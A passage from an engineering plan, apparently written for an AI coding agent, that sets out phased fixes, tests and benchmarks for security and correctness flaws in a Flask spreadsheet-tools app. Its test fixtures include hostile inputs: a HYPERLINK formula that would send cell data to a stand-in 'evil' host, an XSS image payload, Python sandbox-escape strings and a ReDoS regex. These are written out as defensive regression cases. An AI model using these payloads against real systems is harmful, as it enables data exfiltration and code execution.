| D7 | Pipeline transforms that are shown but not implemented (normalization, gap handling, "fake names/hash/bucket") | Implement · Label honestly | **Label honestly now** (Phase 2). Implementing them is a later P2 task, after the normalizer fix. |
| D8 | CSV export injection defence | Prefix risky text cells with `'` · Leave as-is | **Prefix** only text cells starting with `= + - @ \t \r` that do not parse as a number. xlsx uses `strings_to_formulas=False`, so values are unchanged there. |
| D9 | Git remote. `origin` is `TamReversed/DataDragonV2.1`. | Push to it · Create a new v4 repo · Local only | **Local commits only.** The agent never pushes until the owner names a remote. |
| D10 | Higgsfield optional media (Phase 5) | Approve · Skip | **Skip unless approved.** It spends credits. |
| D11 | Retention TTL for uploads and outputs | e.g. 15 min / 60 min | **Uploads deleted as soon as the job has loaded them; outputs deleted 30 min after creation** (configurable with `DATADRAGON_OUTPUT_TTL_MIN`). |

---

## 6. Execution plan for Claude Code

### Conventions used below

- **Repo root:** `/Users/mat/Development/000. DataDragon v4` (note the spaces; always quote it).
- **venv:** `.venv` at the repo root. `PY=.venv/bin/python`, `PYTEST=".venv/bin/python -m pytest"`.
- **"xfail-flip":** Phase 0 adds, for each known bug, a test asserting the **correct** result marked `@pytest.mark.xfail(strict=True, reason="<finding id>")`. The fixing task removes the marker. `strict=True` makes a fixed-but-still-marked test fail, so no fix can go unrecorded.
- Every task ends with: run its verification, run `$PYTEST -q` (the full suite must be green), update `PROGRESS.md`, then make **one** commit.

---

### Phase 0 — Safety net & baselines (no behaviour change)

**T0.1 · Reproducible environment** — I-01, A-12, A-22
- Read: `requirements.txt`, `.gitignore`.
- Change:
  - Pin `pandas>=2.2,<3` and add `xlrd>=2.0.1`, needed for the advertised `.xls` support. Adding `xlrd` changes only the `.xls` path, from crash to working; record this in the commit.
  - Create `requirements-dev.txt` containing `-r requirements.txt`, `pytest`, `pytest-timeout`, `pytest-cov`, `pyflakes` and `pip-audit`.
  - Add `.venv/` to `.gitignore` (only `venv/` and `.venv` without a slash are present).
- Verify:
  - `rm -rf .venv && python3 -m venv .venv && .venv/bin/pip install -q -r requirements-dev.txt && .venv/bin/python -c "import pandas,xlrd; assert pandas.__version__.startswith('2.'), pandas.__version__; print(pandas.__version__)"`
  - `git status --porcelain` shows only the intended files.
- Size S. No dependencies.
- Commit: `chore: pin pandas<3, add xlrd and dev requirements`

**T0.2 · Configurable data directory** — prerequisite for tests (H-03)
- Read: `datadragon.py:29-53`.
- Change: `DATA_DIR = os.environ.get('DATADRAGON_DATA_DIR', BASE_DIR)`, and set `UPLOAD_FOLDER` and `OUTPUT_FOLDER` under it. The default is identical to today.
- Verify: `D=$(mktemp -d) && DATADRAGON_DATA_DIR=$D .venv/bin/python -c "import datadragon" && test -d $D/uploads && test -d $D/output && echo OK`
- Size S. Depends on T0.1.
- Commit: `chore: allow DATADRAGON_DATA_DIR to relocate uploads/output`

**T0.3 · Test harness + smoke tests** — I-01
- Create:
  - `tests/conftest.py`: set `DATADRAGON_DATA_DIR` to a session tmp dir **before** `import datadragon`, provide a `client` fixture (`app.test_client()`), and set `app.config['TESTING']=True`.
  - `tests/helpers.py`:
    - `run_job(fn, *args)` creates a `queue.Queue()` and calls the `*_async` function. It then drains the queue and returns `(final_msg, all_msgs)`, where final is the first message with `stage in ('done','error')`.
    - `read_output(final_msg)` resolves `download_url` to a path under OUTPUT_FOLDER and loads it with `openpyxl` / `pandas` (`dtype=object`).
  - `pytest.ini` with `testpaths=tests`, `timeout=120`, and markers `slow` and `golden`.
  - `tests/test_smoke.py`: GET each page route and assert 200. The routes are `/`, `/landing`, `/excel-splitter`, `/column-analyzer`, `/security-info`, `/data-scrubber`, `/duplicate-finder`, `/unique-identifier-finder`, `/data-merge`, `/data-comparison`, `/pivot-generator`, `/data-validation`, `/column-normalizer`, `/pdf-to-word`, `/column-comparison`, `/transpose`, `/row-filter`, `/find-replace`, `/calculated-columns`, `/column-operations` and `/data-readiness-pipeline`. Also assert that `/generate-test-file?num_rows=50` returns an xlsx with 50 rows.
- Verify: `$PYTEST -q tests/test_smoke.py` passes.
- Size S. Depends on T0.2.
- Commit: `test: add pytest harness and route smoke tests`

**T0.4 · Golden fixtures** — I-01
- Create `tests/fixtures/make_golden.py`, deterministic (no randomness, or `random.Random(42)`). It writes:
  - `golden.xlsx`
    - Sheet `Main`, 40 rows. Columns:
      - `ID`: text `PR-00001`…, with exact duplicates at rows 7 and 8.
      - `Zip`: **text cells** `'00123'`, `'02134'`…
      - `Account`: numeric ints with one blank.
      - `BigId`: text `'9007199254740993'`.
      - `Amount`: floats, including negatives and one blank.
      - `Region`: N/S/blank.
      - `Date`: real Excel dates.
      - `DateText`: mixed `'01/02/2024'`, `'2024-03-05'`, `'13/02/2024'`.
      - `EuroNum`: `'2,5'`, `'1.234,56'`.
      - `Pct`: `'50%'`, `0.5`.
      - `Flag`: True/False.
      - `Name`/`Email`, with one blank Email.
      - `Notes`: includes `'=HYPERLINK("http://evil/?"&A2,"x")'`, `'x|||y'`, `'<img src=x onerror=alert(1)>'`, `'café'`.
    - Sheet `Second`, 5 rows.
  - `golden.csv` (UTF-8): same columns as `Main`.
  - `golden_cp1252.csv`: contains `“Quoted”` and `€5`.
  - `merge_left.csv`, `merge_right.csv`: keys `1,NaN,NaN,2,2` and `1,NaN,NaN,2,3`.
  - `compare_a.csv`, `compare_b.csv`: int key versus the same key with one blank row, plus a duplicate key.
  - `col a<b` header file (`pdf_inject.csv`).
- Update `.gitignore`: add `!tests/fixtures/*.xlsx` and `!tests/fixtures/*.csv` **after** the existing `*.xlsx`/`*.csv` rules. Without this the fixtures will not commit.
- Commit the generated files.
- Verify: `$PY tests/fixtures/make_golden.py && git status --porcelain tests/fixtures | wc -l` shows the files are tracked. Run it twice: `git diff --exit-code tests/fixtures` must be clean. xlsx zips embed timestamps, so make the generator set `wb.properties.created/modified` to a fixed datetime. If xlsx bytes still differ, compare cell contents instead, and note this in PROGRESS.md.
- Size M. Depends on T0.3.
- Commit: `test: add deterministic golden fixtures`

**T0.5 · Characterization (golden) tests + known-bug xfails** — I-01, all A/G findings
- Read: each tool function and route listed below.
- Create `tests/golden/test_<tool>.py`, one per tool. Each test runs the tool on the fixtures and compares a **normalised snapshot** to `tests/golden/expected/<tool>__<case>.json`. The snapshot holds the output cell values (as `repr`), the openpyxl cell `data_type`s and the summary-stat fields of the final message.
- Add `tests/golden/conftest.py` with a `--update-golden` flag that rewrites expected files. That flag may only be used in a commit whose message lists every changed snapshot and why.
- Tools, and how to invoke each:

  | Tool | Invoke |
  |---|---|
  | split | `split_excel_file` |
  | analyze | `analyze_dataframe(read_data_file(...))` |
  | duplicates | `find_duplicates_async` |
  | unique-id | `find_unique_identifier_async` |
  | merge | `merge_files_async` |
  | compare | `compare_files_async` |
  | pivot | `generate_pivot_async` |
  | validate | `validate_data_async` |
  | normalize | `normalize_columns_async` |
  | scrub | `scrub_file_async` |
  | column compare | `compare_columns_async` |
  | transpose | `transpose_file_async` |
  | row-filter | POST `/row-filter` |
  | find-replace | POST `/find-replace` |
  | calculated-columns | POST `/calculated-columns`, `preview_only=true` |
  | column-ops | POST `/column-operations` |
  | pipeline | `/pipeline/start` → `/analyze` → `/keys` → `/keys/confirm` → `/transformations` → `/transformations/select` → `/execute` |

- Read each route's `request.form` keys before writing its test.
- Add `tests/test_known_bugs.py`, with one strict-xfail test per row below, asserting the **correct** behaviour:

  | Test | Finding | Correct assertion |
  |---|---|---|
  | `test_read_preserves_leading_zeros` | A-01 | Split output cell for `Zip` = `'00123'`, data_type `'s'` |
  | `test_merge_null_keys_do_not_match` | A-02 | Inner join of `merge_left`/`merge_right` has 3 rows (1↔1, 2↔2 ×2), none with null key |
  | `test_merge_stats_non_negative` | A-03 | All unmatched counts ≥ 0; same-name key left join reports unmatched correctly |
  | `test_compare_int_float_keys` | A-04 | `common=2, added=1, removed=0` |
  | `test_compare_null_key_not_added_and_removed` | A-04 | Null key not in both lists |
  | `test_compare_duplicate_keys_reported` | A-04 | Duplicate key surfaced as warning or changed row |
  | `test_duplicates_no_separator_collision` | A-05 | `x|||y`/`z` vs `x`/`y|||z` are not duplicates |
  | `test_pivot_keeps_blank_keys` | A-06 | Total includes blank-region amount, row labelled `(blank)` |
  | `test_pivot_mean_empty_is_blank` | A-06 | Empty mean cell is None, not 0 |
  | `test_pivot_filters_work` | A-19 | Filter `{"Region":"N"}` returns only N |
  | `test_scrub_relationship_never_leaks` | A-07 | No original Name/Email value appears anywhere in output |
  | `test_normalize_euro_decimal` | A-08 | `'2,5'` → 2.5 when locale=comma-decimal |
  | `test_normalize_never_overwrites_with_nat` | A-08 | Unparseable date keeps original text |
  | `test_validation_range_string_bounds` | A-10 | 5 fails `{"min":"1","max":"3"}` |
  | `test_validation_pattern_fullmatch` | A-10 | `123456789` fails `\d{5}` |
  | `test_semantic_id_not_postal` | A-11 | `ID` column type ≠ Postal Code; no confidence > 100 |
  | `test_analyze_bool_column` | A-21 | Analysis completes with a bool column |
  | `test_findreplace_wholecell_alternation` | A-13 | `Axx` unchanged for `A|B` whole-cell |
  | `test_blank_not_written_as_nan` | A-13 | Find & Replace on a column with blanks leaves blanks blank |
  | `test_calc_formula_cannot_reach_os` | G-01 | `pd.io.common.os.getcwd()` → 4xx, no cwd in body |
  | `test_cache_isolated_between_clients` | G-02 | Client B's `/get-cached-files` lacks A's file; B gets 404 on A's `cache_id` |
  | `test_download_requires_owner` | G-03 | B gets 404 on A's `/download/<name>` |
  | `test_export_formula_injection_neutralised` | G-06 | `Notes` cell in xlsx output has data_type `'s'` |
  | `test_regex_redos_bounded` | G-07 | `(a+)+$` request returns within 3 s with 4xx |
  | `test_concurrent_split_isolated` | H-01 | Two splits started in the same second both succeed; each zip has only its own rows (use `unittest.mock.patch` on `datetime` in datadragon to force identical timestamps) |
  | `test_calc_with_cache_id` | H-04 | 200 |
  | `test_pipeline_execute_without_analyze` | H-05 | No 500 |
  | `test_pipeline_pdf_escapes_column_names` | G-04 | Execute with `pdf_inject.csv` succeeds |
  | `test_pipeline_key_uniqueness_on_full_data` | A-09 | Duplicate rows → key not reported unique |
  | `test_xls_upload_reads` | A-22 | Write a tiny `.xls` with `xlwt` **only if available**; otherwise skip with reason (do **not** add `xlwt` as a dependency) |

- Verify: `$PYTEST -q` reports all golden tests passing and every known-bug test as `xfailed`. `$PYTEST -q -rx | grep -c XFAIL` equals the number of rows above, minus any skips.
- Size L. Depends on T0.4.
- Commit: `test: characterization snapshots for all tools and strict xfails for known bugs`

**T0.6 · Performance baselines** — E-01…E-06
- Create:
  - `scripts/gen_synthetic.py N {csv|xlsx} OUTDIR`: 15 columns, the same as the audit's (id, first/last name, email, phone, date string, amount, qty, category, region, status, zip text, nullable discount, notes, vendor_code), `random.Random(0)`.
  - `scripts/bench.py FILE CASE…`: each case runs in a fresh subprocess, prints wall time and `resource.getrusage(RUSAGE_CHILDREN).ru_maxrss` in MB, and has a per-case timeout argument.
  - `docs/BASELINES.md`.
- Cases:
  - `read`, `write_xlsx`, `analyze`
  - `dup_lowcard` (dupe cols region+status)
  - `dup_highcard` (dupe cols last_name+amount)
  - `uniqueid12`, `pivot` (rows=region, cols=status, values=amount, sum)
  - `validate` (3 rules), `compare1key`, `split40k`
  - `keyworst` (20 three-valued columns, 20k rows)
- Run at 10k and 100k. Run at 500k only for `read`, `analyze`, `pivot` and `validate`. Use a 900 s cap; record "timeout" rather than waiting.
- Verify: `docs/BASELINES.md` has a filled table with machine, Python and pandas versions and the exact commands used. `$PY scripts/bench.py /tmp/syn_10000.csv analyze` runs in under 10 s.
- Size M. Depends on T0.1.
- Commit: `perf: add synthetic data generator, benchmark harness and recorded baselines`

**T0.7 · CI + agent docs** — I-01, H-07, F-04
- Create `.github/workflows/ci.yml` (ubuntu, Python 3.12 and 3.14 matrix). Steps:
  - `pip install -r requirements-dev.txt`
  - `pytest -q -m "not slow"`
  - `pyflakes datadragon.py | grep -E "undefined name" && exit 1 || true` (gate only on undefined names until T4.1)
  - `pip-audit -r requirements.txt || true` (non-gating until T2.1)
- Also create `CLAUDE.md` from §8 and `PROGRESS.md`, listing every task ID with status `todo`.
- Verify:
  - `.venv/bin/python -c "import yaml,sys; yaml.safe_load(open('.github/workflows/ci.yml'))"`. If PyYAML is absent, use `ruby -ryaml -e 'YAML.load_file(".github/workflows/ci.yml")'`.
  - Locally run the same three commands and confirm the exit codes are as intended.
  - **Do not push** (D9).
- Size S.
- Commit: `ci: add GitHub Actions workflow; add CLAUDE.md and PROGRESS.md`

**Phase 0 gate:** an independent subagent reviews `git diff <phase-start>..HEAD` against this section: no non-test code changed except T0.1/T0.2. Then report to the owner.

---

### Phase 1 — P0 fixes

**T1.1 · Safe formula evaluator** — G-01
- Read: `datadragon.py:5851-6060` (route plus `evaluate_formula`). List every supported function in `function_map` and the `[Column]` reference syntax.
- Change:
  - Create `datadragon_formula.py`: parse the rewritten expression with `ast.parse(mode='eval')`.
  - Allow only: `Expression`, `BinOp` (`+ - * / % **`, with `**` exponent capped at 10), `UnaryOp`, `BoolOp`, `Compare`, `Constant` (str/int/float/bool), `Name` limited to `__df__` and the `function_map` keys, `Subscript` only of the form `__df__['literal']`, and `Call` only to `function_map` names with no keywords/starargs.
  - Reject `Attribute`, `Lambda`, comprehensions, `Starred` and dunder names, raising `FormulaError`.
  - Evaluate by walking the tree yourself. **No `eval`, no `compile`.**
  - The route returns 400 with a friendly message on `FormulaError`.
  - Remove `pd` and `np` from the namespace.
- Verify:
  - The xfail-flip `test_calc_formula_cannot_reach_os` passes.
  - New `tests/test_formula.py`: rejects `pd.io.common.os.getcwd()`, `__df__.__class__`, `().__class__.__bases__`, `(lambda:1)()`, `[x for x in 'a']` and `__import__('os')`. Accepts every function in `function_map` with one example each, using the golden calc snapshots.
  - `grep -nE "\beval\(|\bexec\(|compile\(" datadragon.py datadragon_formula.py` returns nothing.
- Size M. Depends on Phase 0.
- Commit: `security: replace eval-based formula engine with AST allow-list evaluator (G-01)`

**T1.2 · Same-origin protection for state-changing requests** — G-01 (drive-by), G-10
- Change:
  - Add an `@app.before_request` hook. For `POST/PUT/DELETE`, if an `Origin` header is present and its host is not `request.host`, return 403. If `Origin` is absent but `Referer` is present and cross-host, return 403.
  - Set `SESSION_COOKIE_SAMESITE='Lax'`, `SESSION_COOKIE_HTTPONLY=True`, and `SESSION_COOKIE_SECURE` from env `DATADRAGON_HTTPS=1`.
- Verify: `tests/test_csrf.py`. A POST to `/calculated-columns` with `Origin: https://evil.example` returns 403. With `Origin: http://localhost` (the test client host) or no Origin, the request proceeds.
- Size S. Depends on T1.1.
- Commit: `security: reject cross-origin state-changing requests (G-01, G-10)`

**T1.3 · Owner-scoped jobs, cache and downloads** — G-02, G-03
- Read: L29-31, L100-155, L590-675, L817-865, L898-952, L2198-2290, L6288-6380 and every `progress_queues[...] =` / `cache_session_file(` call (`grep -n`).
- Change:
  1. `SECRET_KEY = os.environ.get('DATADRAGON_SECRET_KEY') or secrets.token_hex(32)`, logging a warning when generated.
  2. Add a `before_request` that sets `session['owner'] = secrets.token_urlsafe(16)` if it is absent.
  3. Add a `JobRegistry` (dict plus `threading.Lock`) mapping `job_id → {owner, created, files:set, queue}`. Every route that starts work registers the job with `session['owner']`.
  4. `cache_session_file` stores the owner. `/get-cached-files` filters by owner. `/use-cached-file` and `/download-cached-file` return 404 unless the owner matches, and **stop returning absolute paths**.
  5. `/download/<name>`, `/fetch-analysis/<id>`, `/progress/<id>` and `/pipeline/<id>/*` return 404 unless the requester owns the job or file.
  6. Background threads can't read `session`, so capture `owner` in the route and pass it in.
- Verify:
  - xfail-flips `test_cache_isolated_between_clients` and `test_download_requires_owner` pass, using two separate `app.test_client()` instances with separate cookie jars.
  - All golden tests still pass (the helpers must reuse one client per test).
- Size L. Depends on T1.2.
- Commit: `security: bind jobs, cache entries and downloads to a per-browser owner (G-02, G-03)`

**T1.4 · Collision-free job directories and filenames** — H-01, G-03
- Read: `grep -n "strftime('%Y%m%d_%H%M%S')\|timestamp}" datadragon.py`. List every output path.
- Change: add `job_dir(job_id)` returning `OUTPUT_FOLDER/<job_id>/`, where `job_id = secrets.token_urlsafe(12)`. All tool outputs (zips, xlsx, json mapping keys, PDFs) go there, keeping their human-readable basenames. `/download/<job_id>/<name>` (update all `download_url` builders and the templates that build URLs) validates both segments with `secure_filename` plus the realpath-prefix check. The splitter's temporary chunk dir lives inside its job dir.
- Verify:
  - xfail-flip `test_concurrent_split_isolated` passes.
  - `grep -n "OUTPUT_FOLDER'\], f\"" datadragon.py` shows only `job_dir` users.
  - Golden snapshots are unchanged apart from `download_url` (normalise it in the snapshot helper).
- Size M. Depends on T1.3.
- Commit: `fix: isolate each job in its own output directory with random ids (H-01)`

**T1.5 · Lossless file reading** — A-01, A-14, A-16, A-21, A-22 (D3)
- Read: L243-353 and every `read_excel(`/`read_csv(` call (about 36; `grep -n`).
- Change:
  - `read_data_file(path, mode='lossless'|'infer', sheet_name=0)`:
    - **xlsx/xls lossless:** `pd.read_excel(path, sheet_name=sheet_name, dtype=object)`, then **verify empirically** that text cell `'00123'` stays `'00123'`, numeric cells stay int/float and date cells stay `Timestamp`. If pandas still converts text cells, read through openpyxl directly (`load_workbook(read_only=True, data_only=True)`) and build the DataFrame from `ws.iter_rows(values_only=True)`.
    - **CSV lossless:** `dtype=str, keep_default_na=False, na_values=['']`.
    - Encodings: try `utf-8-sig`, then `cp1252`, then `latin-1`, retrying **only** on `UnicodeDecodeError`.
  - Replace all direct `read_excel`/`read_csv` calls with `read_data_file`. Mode per tool:
    - **lossless:** split, merge, compare, duplicates, unique-id, scrub, find/replace, row filter, column ops, transpose, validation, normalizer, column compare.
    - **infer:** analyzer, and the pivot value columns (convert with `pd.to_numeric(errors='coerce')` and report the count of non-numeric values that were ignored).
  - Row filter numeric operators convert per comparison with `pd.to_numeric`.
  - Multi-sheet: all tools read `sheet_name=0` as today, **but** the final message includes `sheet_names` and a `warning` when there is more than one sheet. The splitter UI shows that warning.
  - Fix the bool crash (A-21): `is_numeric_dtype(c) and not is_bool_dtype(c)` at L1306.
- Verify:
  - xfail-flips `test_read_preserves_leading_zeros`, `test_analyze_bool_column` and `test_xls_upload_reads` (if not skipped) pass.
  - New test: `read_data_file('golden_cp1252.csv')` contains `“Quoted”` and `€5`.
  - Golden snapshots: run `--update-golden`, then **review every diff**. The only allowed changes are values or types that became *more* faithful to the source (e.g. `123`→`'00123'`, `1.0`→`1`). List them in the commit body.
  - `grep -c "pd.read_excel\|pd.read_csv" datadragon.py` returns 2 (both inside `read_data_file`).
- Size L. Depends on T1.4.
- Commit: `fix: lossless reading of xlsx/csv across all pass-through tools (A-01, A-14, A-16, A-21, A-22)`

**T1.6 · Merge correctness** — A-02, A-03
- Read: L3196-3424.
- Change:
  - Split each side into null-key and non-null-key rows, and merge the non-null rows with `indicator=True`.
  - For left/outer joins, append the left null-key rows as unmatched. For right/outer joins, do the same with the right null-key rows.
  - Stats come from `_merge` value counts and distinct-key `isin`.
  - Add `rows_in_left`, `rows_out` and `multiplication_factor`, plus a `warning` when `rows_out > rows_in_left` under `keep_all`.
  - Drop `_merge` from the output.
- Verify: xfail-flips `test_merge_null_keys_do_not_match` and `test_merge_stats_non_negative` pass. The merge golden snapshot diff is limited to stats keys (document it).
- Size M.
- Commit: `fix: merge never matches null keys and reports accurate statistics (A-02, A-03)`

**T1.7 · Compare rewrite (correctness + O(n log n))** — A-04, E-01
- Read: L3497-3775.
- Change:
  - Read lossless. Reject null keys and list them separately (count plus first 100).
  - Detect duplicate keys per side and report them. Compare duplicates in order using `groupby(keys).cumcount()` as an extra key.
  - Use `merge(on=keys+['_dup'], how='outer', indicator=True, suffixes=('_a','_b'))`. A changed cell is `~((a==b) | (a.isna() & b.isna()))` per compare column.
  - Build the changed-rows output vectorised.
- Verify:
  - The three compare xfail-flips pass.
  - `$PY scripts/bench.py /tmp/syn_100000.csv compare1key` takes **< 15 s** (baseline 391 s). Record the result in `docs/BASELINES.md`.
- Size L.
- Commit: `fix: vectorised compare with correct null/duplicate key handling (A-04, E-01)`

**T1.8 · Duplicate finder rewrite** — A-05, E-02
- Read: L2362-2538.
- Change: `mask = df.duplicated(cols, keep=False)`, then `groups = df[mask].groupby(cols, dropna=False, sort=False)`. Keep the output columns identical. Add an option `treat_blank_as_value` (default True, today's behaviour) and label it in the UI (`templates/duplicate_finder.html`).
- Verify: xfail-flip `test_duplicates_no_separator_collision` passes. `bench dup_highcard` at 100k runs **< 5 s** (baseline 49 s).
- Size M.
- Commit: `fix: exact duplicate grouping without signature collisions (A-05, E-02)`

**T1.9 · Pivot correctness** — A-06, A-19
- Read: L3842-4270 and `templates/pivot_generator.html` (filters payload).
- Change:
  - Fill NaN in row/column fields with `'(blank)'` before `pivot_table`.
  - `fill_value=0` only for `sum`/`count`.
  - Filters: `list(filters.keys())`, compare with `df[col].astype(str).str.strip() == str(val).strip()`.
  - Use the count format `#,##0` for count.
  - Apply the `Total` styling only to the margins row/column, by position, not by label prefix.
- Verify: the three pivot xfail-flips pass, and the golden pivot snapshot diff is explained.
- Size M.
- Commit: `fix: pivot keeps blank keys, honest empty cells, working filters (A-06, A-19)`

**T1.10 · Anonymizer leak + PII logging** — A-07, G-08 (logs)
- Read: L1582-2035.
- Change:
  - Relationship mode: build the composite key with a NaN sentinel (e.g. `'\x00NA'`). Every non-null value in a scrubbed column always gets a pseudonym, and **no code path returns an original value**.
  - Normalise values with `str(v)` before mapping, and keep `1` vs `True` distinct by including the type name for non-str values.
  - Export the mapping as a list of records `{column, original, pseudonym}`.
  - Delete every `print` that outputs cell values (L1737, L1763-1859, L1914-1967; `grep -n "print(" ` in that range).
  - Keep the existing pre-save and post-save verification, and extend it: fail if any original non-null value of a scrubbed column appears in that column of the output.
- Verify:
  - xfail-flip `test_scrub_relationship_never_leaks` passes.
  - New property test: for golden `Main`, scrub `Name`+`Email` in both modes. `set(orig) ∩ set(out)` = ∅ for each column.
  - `grep -nE "print\(.*(original|value|mapping)" datadragon.py` returns nothing in the scrub range.
- Size M.
- Commit: `security: anonymizer never emits original values; remove PII debug logging (A-07)`

**T1.11 · Normalizer correctness** — A-08
- Read: L4630-4983 and `templates/column_normalizer.html`.
- Change:
  - New form inputs: `decimal_separator` (`.` or `,`, default `.`) and `date_order` (`auto|MDY|DMY|YMD`, default `auto`). `auto` succeeds only if the column is unambiguous: if any value has its first part > 12, the order is DMY; if any value has its second part > 12, MDY. Otherwise ask the user and return 400 listing the ambiguous samples.
  - Numbers: strip thousands separators according to the locale, then `pd.to_numeric(errors='coerce')`.
  - Integer: reject non-integral values (count them, keep the originals) and use `Int64`.
  - Percent: divide by 100 only when `%` is present.
  - Dates: use an explicit format list per order.
  - **Unparseable values keep their original value** and are counted in `errors`, with the first 20 samples.
  - Build a new Series and assign the whole column (pandas-3 safe).
  - Formats: `df.columns.get_loc(col)+1` (L4827).
- Verify: the two normalizer xfail-flips pass. New tests cover `'1.234,56'`→1234.56 (comma locale), `3.7` integer → kept and error counted, mixed `%`, and `'13/02/2024'` with DMY → 2024-02-13.
- Size L.
- Commit: `fix: locale- and date-order-explicit normalizer that never destroys originals (A-08)`

**T1.12 · Deployable process model** — H-02 (D1)
- Change:
  - Add a `Procfile`: `web: gunicorn -k gthread -w 1 --threads 8 -t 0 -b 0.0.0.0:${PORT:-5002} datadragon:app`.
  - `__main__` reads `PORT` (default 5002) and `HOST` (default `127.0.0.1`).
  - Fix the SSE generator to catch `queue.Empty` only (H-06).
  - Add `GET /healthz` returning `{"ok":true}`.
  - Add a README note that multi-worker deployment is unsupported until job state is externalised.
- Verify:
  - `.venv/bin/gunicorn -k gthread -w 1 --threads 8 -t 0 -b 127.0.0.1:5099 datadragon:app &` then `curl -sf localhost:5099/healthz`, then run the analyze→progress flow 8 times concurrently with `scripts/smoke_progress.py` (create it). All 8 should succeed. Kill the server afterwards.
  - `$PYTEST -q` passes.
- Size S.
- Commit: `ops: single-worker gthread Procfile, PORT/HOST env, health check, SSE disconnect fix (H-02, H-06)`

**Phase 1 gate:**
- Independent subagent review of the phase diff.
- `$PYTEST -q`: all P0 xfails flipped.
- `pip-audit` unchanged (it is fixed in T2.1).
- Report the before/after numbers for compare and duplicates.

---

### Phase 2 — P1

**T2.1 · Upgrade Flask/Werkzeug** — G-05
- Change: `Flask>=3.1.3,<4`, `Werkzeug>=3.1.6,<4`.
- Verify: `.venv/bin/pip-audit -r requirements.txt` exits 0, `$PYTEST -q` passes, and the CI `pip-audit` step becomes gating.
- Size S.
- Commit: `deps: upgrade Flask/Werkzeug to patched 3.1.x (G-05)`

**T2.2 · XSS and PDF escaping** — G-04
- Read: `templates/column_analyzer.html:2080-2160`. Run `grep -n "innerHTML" templates/*.html`.
- Change:
  - Wrap `${value}` at `:2090` and `:2152` in `escapeHtml()`.
  - Audit every template-literal interpolation that flows into `innerHTML` and escape any server or file-derived string.
  - In Python, add `from xml.sax.saxutils import escape` and use it for every user-derived string passed to reportlab `Paragraph` (L7016-7170, and `generate_natural_key_report` L2598-2876).
  - Add `scripts/check_innerhtml.py`. It scans templates for `${...}` inside backtick strings on lines between an `innerHTML` assignment and the closing backtick, and fails on any interpolation not wrapped in `escapeHtml(`, `Number(`, `.toLocaleString(` or `.toFixed(`, or not in an allow-list comment `/* safe: reason */`.
- Verify:
  - xfail-flip `test_pipeline_pdf_escapes_column_names` passes.
  - `$PY scripts/check_innerhtml.py` exits 0.
  - Manual browser check: upload `golden.xlsx` to Column Analyzer and confirm the Notes payload renders as text.
- Size M.
- Commit: `security: escape file-derived values in HTML and PDF output (G-04)`

**T2.3 · Formula-injection-safe exports + faster xlsx writes** — G-06, E-06 (D8)
- Change:
  - Add `xlsxwriter>=3.2` to requirements.
  - Every DataFrame→xlsx write goes through a helper `excel_writer(path)`, which returns `pd.ExcelWriter(path, engine='xlsxwriter', engine_kwargs={'options': {'strings_to_formulas': False, 'strings_to_urls': False}})`.
  - Where code later reopens a file with openpyxl for styling (pivot L4022, normalizer formats, reports), move the styling to xlsxwriter formats on `writer.sheets[name]` before closing.
  - CSV writes go through `sanitize_csv(df)`: prefix `'` to string cells matching `^[=+\-@\t\r]` that don't parse as a float.
- Verify:
  - xfail-flip `test_export_formula_injection_neutralised` passes.
  - `grep -n "to_excel(" datadragon.py` shows every call using `excel_writer` (or document any exception in PROGRESS.md).
  - Golden snapshots unchanged in values.
  - Re-run `bench write_xlsx` at 100k and record it (expect it to be faster).
- Size L.
- Commit: `security: write xlsx with strings_to_formulas off and sanitize CSV exports (G-06)`

**T2.4 · ReDoS protection** — G-07
- Change:
  - Add the `regex>=2024` dependency.
  - User patterns (find/replace, the whole-cell variant and the validation pattern) compile with `regex.compile`, with a length cap of 500. They are applied via `Series.map(lambda s: pat.sub(repl, s, timeout=0.05))` with an overall job deadline of 20 s. On `TimeoutError`, return 422 "Pattern too complex".
  - Whole-cell matching uses `fullmatch` (A-13).
- Verify: xfail-flips `test_regex_redos_bounded` and `test_findreplace_wholecell_alternation` pass.
- Size M.
- Commit: `security: bounded-time regex for find/replace and validation (G-07, A-13)`

**T2.5 · Retention, cleanup robustness, bounded concurrency** — G-08, H-03, H-08 (D11)
- Change:
  - Delete each upload once its job has loaded the DataFrame.
  - The sweeper deletes job dirs older than `DATADRAGON_OUTPUT_TTL_MIN` (default 30) and stale `uploads/*`.
  - `/download` **no longer deletes on first download** (H-08).
  - The cleanup loop body gets `try/except Exception: log`, and every dict is iterated as `list(d.items())` under the registry lock.
  - Add `ThreadPoolExecutor(max_workers=int(os.environ.get('DATADRAGON_MAX_JOBS', 4)))` and replace all 17 `threading.Thread(` job launches with `executor.submit`.
  - `progress_queues` entries expire after 10 min.
  - Pipeline sessions are capped (3 per owner, 20 total, LRU) and expire on *last activity*.
- Also rewrite `templates/security_info.html` claims (`:214, :280, :293, :455, :649`) so they match actual behaviour for both localhost and hosted modes.
- Verify: `tests/test_retention.py` uses `monkeypatch` on `time.time` to show that a job dir older than the TTL is removed by one `cleanup_*` call, and that a second download within the TTL returns 200. `grep -c "threading.Thread(" datadragon.py` returns 1 (the cleanup thread only).
- Size L.
- Commit: `ops: TTL-based retention, re-downloadable outputs, bounded job pool, robust cleanup (G-08, H-03, H-08)`

**T2.6 · Crash fixes bundle** — H-04, H-05, A-12
- Change:
  - L5863 `get_cached_file` → `get_cached_file_by_id`, and `cache_info['name']`, enforcing owner (T1.3).
  - L7044 `stage_data.get(1) or {}`, and `execute` returns 409 if a prerequisite stage hasn't run.
  - Re-running stage N clears `stage_data[k]` and `user_decisions[k]` for k > N.
  - The SSE generator deletes `progress_queues[sid]` only if it `is` the queue it served.
  - Pipeline zip cached under its real name.
  - Transpose: rename the first column via `.rename` (L5438) and pre-check `len(df) <= 16383`, returning 400 with a message otherwise.
- Verify: xfail-flips `test_calc_with_cache_id` and `test_pipeline_execute_without_analyze` pass. New tests cover pipeline stage invalidation and transpose with 16,384 rows returning 400.
- Size M.
- Commit: `fix: calculated-columns cache path, pipeline stage guards, transpose limits (H-04, H-05, A-12)`

**T2.7 · Semantic type detection** — A-11
- Read: L954-1203.
- Change:
  - Per type, compute the confidence as `(m1|m2|...).mean()*100` and clamp it to 100.
  - Order: boolean → date (`pd.to_datetime(format='mixed', errors='coerce')`, no `infer_datetime_format`) → email/phone/url → postal (US `^\d{5}(-\d{4})?$`, UK/CA patterns only if the column name hints postal or zip) → currency → percentage (only if `%` is present or the name hints at it) → identifier (high uniqueness plus an alphanumeric pattern) → text.
  - Fix the `^(USD|EUR|...)$` grouping.
